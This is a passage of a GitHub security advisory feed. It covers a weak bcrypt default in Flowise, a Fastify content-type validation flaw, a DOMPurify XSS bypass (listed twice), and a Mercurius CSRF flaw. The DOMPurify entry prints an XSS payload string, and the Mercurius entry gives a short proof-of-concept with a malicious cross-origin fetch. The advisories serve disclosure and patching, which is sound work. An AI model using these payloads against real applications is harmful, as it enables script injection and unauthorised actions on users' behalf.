<p>The default bcrypt salt rounds is 5 (line 6), which provides only 2^5=32 iterations. OWASP recommends minimum 10 rounds (1024 iterations) for bcrypt. While configurable via PASSWORD_SALT_HASH_ROUNDS env var, the default matters because: (1) most deployments use defaults, (2) existing password hashes at 5 rounds remain vulnerable even if later increased. With modern GPUs, 5 rounds allows ~300,000 hashes/second vs ~10,000/second at 10 rounds - a 30x difference in cracking speed. In a database breach scenario, all user passwords could be cracked significantly faster. The same weak default is used in resetPassword (account.service.ts:568). This is a cryptographic weakness with real-world impact on password security.</p>
<p><strong>Detection Method:</strong> Kolega.dev Deep Code Scan</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Severity</td>
<td>Medium</td>
</tr>
<tr>
<td>CWE</td>
<td>CWE-916 (Use of Password Hash With Insufficient Computational Effort)</td>
</tr>
<tr>
<td>Location</td>
<td>packages/server/src/enterprise/utils/encryption.util.ts:5-7</td>
</tr>
<tr>
<td>Practical Exploitability</td>
<td>Medium</td>
</tr>
<tr>
<td>Developer Approver</td>
<td><a href="mailto:faizan@kolega.ai">faizan@kolega.ai</a></td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x2g5-fvc2-gqvp">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x2g5-fvc2-gqvp</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/5665">https://github.com/FlowiseAI/Flowise/pull/5665</a></li>
<li><a href="https://github.com/advisories/GHSA-x2g5-fvc2-gqvp">https://github.com/advisories/GHSA-x2g5-fvc2-gqvp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2g5-fvc2-gqvp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T21:54:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastify] Fastify's Missing End Anchor in "subtypeNameReg" Allows Malformed Content-Types to Pass Validation]]></title>
        <id>https://github.com/advisories/GHSA-573f-x89g-hqp9</id>
        <link href="https://github.com/advisories/GHSA-573f-x89g-hqp9"/>
        <updated>2026-03-05T21:29:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<p>Fastify incorrectly accepts malformed <code>Content-Type</code> headers containing trailing characters after the subtype token, in violation of <a href="https://httpwg.org/specs/rfc9110.html#field.content-type">RFC 9110 §8.3.1</a>. For example, a request sent with <code>Content-Type: application/json garbage</code> passes validation and is processed normally, rather than being rejected with <code>415 Unsupported Media Type</code>.</p>
<p>When regex-based content-type parsers are in use (a documented Fastify feature), the malformed value is matched against registered parsers using the full string including the trailing garbage. This means a request with an invalid content-type may be routed to and processed by a parser it should never have reached.</p>
<h2 id="impact">Impact</h2>
<p>An attacker can send requests with RFC-invalid <code>Content-Type</code> headers that bypass validity checks, reach content-type parser matching, and be processed by the server. Requests that should be rejected at the validation stage are instead handled as if the content-type were valid.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Deploy a WAF rule to protect against this</p>
<h2 id="fix">Fix</h2>
<p>The fix is available starting with v5.8.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify/security/advisories/GHSA-573f-x89g-hqp9">https://github.com/fastify/fastify/security/advisories/GHSA-573f-x89g-hqp9</a></li>
<li><a href="https://github.com/fastify/fastify/commit/67f6c9b32cb3623d3c9470cc17ed830dd2f083d7">https://github.com/fastify/fastify/commit/67f6c9b32cb3623d3c9470cc17ed830dd2f083d7</a></li>
<li><a href="https://httpwg.org/specs/rfc9110.html#field.content-type">https://httpwg.org/specs/rfc9110.html#field.content-type</a></li>
<li><a href="https://github.com/advisories/GHSA-573f-x89g-hqp9">https://github.com/advisories/GHSA-573f-x89g-hqp9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-573f-x89g-hqp9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T21:29:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify contains a Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</id>
        <link href="https://github.com/advisories/GHSA-v2wj-7wpq-c8vv"/>
        <updated>2026-03-05T20:25:13.000Z</updated>
        <content type="html"><![CDATA[<p>DOMPurify 3.1.3 through 3.3.1 and 2.5.3 through 2.5.8, fixed in 2.5.9 and 3.3.2, contain a cross-site scripting vulnerability that allows attackers to bypass attribute sanitization by exploiting five missing rawtext elements (noscript, xmp, noembed, noframes, iframe) in the <code>SAFE_FOR_XML</code> regex. Attackers can include payloads like <code>&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;</code> in attribute values to execute JavaScript when sanitized output is placed inside these unprotected rawtext contexts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0540">https://nvd.nist.gov/vuln/detail/CVE-2026-0540</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5">https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5</a></li>
<li><a href="https://github.com/cure53/DOMPurify">https://github.com/cure53/DOMPurify</a></li>
<li><a href="https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml">https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml</a></li>
<li><a href="https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml">https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml</a></li>
<li><a href="https://github.com/advisories/GHSA-v2wj-7wpq-c8vv">https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-03T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify contains a Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</id>
        <link href="https://github.com/advisories/GHSA-v2wj-7wpq-c8vv"/>
        <updated>2026-03-05T20:25:13.000Z</updated>
        <content type="html"><![CDATA[<p>DOMPurify 3.1.3 through 3.3.1 and 2.5.3 through 2.5.8, fixed in 2.5.9 and 3.3.2, contain a cross-site scripting vulnerability that allows attackers to bypass attribute sanitization by exploiting five missing rawtext elements (noscript, xmp, noembed, noframes, iframe) in the <code>SAFE_FOR_XML</code> regex. Attackers can include payloads like <code>&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;</code> in attribute values to execute JavaScript when sanitized output is placed inside these unprotected rawtext contexts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0540">https://nvd.nist.gov/vuln/detail/CVE-2026-0540</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5">https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5</a></li>
<li><a href="https://github.com/cure53/DOMPurify">https://github.com/cure53/DOMPurify</a></li>
<li><a href="https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml">https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml</a></li>
<li><a href="https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml">https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml</a></li>
<li><a href="https://github.com/advisories/GHSA-v2wj-7wpq-c8vv">https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v2wj-7wpq-c8vv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-03T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mercurius] Mercurius: Incorrect Content-Type parsing can lead to CSRF attack]]></title>
        <id>https://github.com/advisories/GHSA-v66j-6wwf-jc57</id>
        <link href="https://github.com/advisories/GHSA-v66j-6wwf-jc57"/>
        <updated>2026-03-05T20:42:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Cross-Site Request Forgery (CSRF) vulnerability was identified in Mercurius versions 16. The issue arises from incorrect parsing of the <code>Content-Type</code> header in requests. Specifically, requests with <code>Content-Type</code> values such as <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code> could be misinterpreted as <code>application/json</code>. This misinterpretation bypasses the preflight checks performed by the <code>fetch()</code> API, potentially allowing unauthorized actions to be performed on behalf of an authenticated user.</p>
<hr>
<h3 id="impact">Impact</h3>
<p>An attacker could exploit this vulnerability by crafting a malicious request with a <code>Content-Type</code> that Fastify incorrectly parses as <code>application/json</code>. When such a request is made from a different origin, it bypasses the Cross-Origin Resource Sharing (CORS) protections, leading to a potential CSRF attack. This could result in unauthorized actions being performed on behalf of an authenticated user without their consent.</p>
<hr>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-javascript">// Server-side Fastify setup
const Fastify = require('fastify');
const mercurius = require('mercurius');

const app = Fastify();
const schema = `
  type Query {
    hello(name: String): String
  }
`;

const resolvers = {
  Query: {
    hello: (_, { name }) =&gt; `Hello ${name || 'World'}!`
  }
};

app.register(mercurius, { schema, resolvers });

app.listen(3000, () =&gt; {
  console.log('Server listening on http://localhost:3000');
});
</code></pre>
<pre><code class="language-javascript">// Malicious client-side code
fetch('http://localhost:3000/graphql', {
  method: 'POST',
  body: JSON.stringify({ query: '{ hello(name: "attacker") }' }),
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include'
});
</code></pre>
<p>In the above example, the malicious request is crafted to exploit the CSRF vulnerability by using a <code>Content-Type</code> that Fastify incorrectly parses as <code>application/json</code>.</p>
<hr>
<h3 id="mitigation">Mitigation</h3>
<p>To address this vulnerability, CSRF protection has been implemented.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/mercurius-js/mercurius/pull/1187">https://github.com/mercurius-js/mercurius/pull/1187</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mercurius-js/mercurius/security/advisories/GHSA-v66j-6wwf-jc57">https://github.com/mercurius-js/mercurius/security/advisories/GHSA-v66j-6wwf-jc57</a></li>
<li><a href="https://github.com/mercurius-js/mercurius/pull/1187">https://github.com/mercurius-js/mercurius/pull/1187</a></li>
<li><a href="https://github.com/mercurius-js/mercurius/commit/962d402ec7a92342f4a1b7f5f04af01776838c3c">https://github.com/mercurius-js/mercurius/commit/962d402ec7a92342f4a1b7f5f04af01776838c3c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64166">https://nvd.nist.gov/vuln/detail/CVE-2025-64166</a></li>
<li><a href="https://github.com/advisories/GHSA-v66j-6wwf-jc57">https://github.com/advisories/GHSA-v66j-6wwf-jc57</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66j-6wwf-jc57</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T18:18:01.000Z</published>
    </entry>
</feed>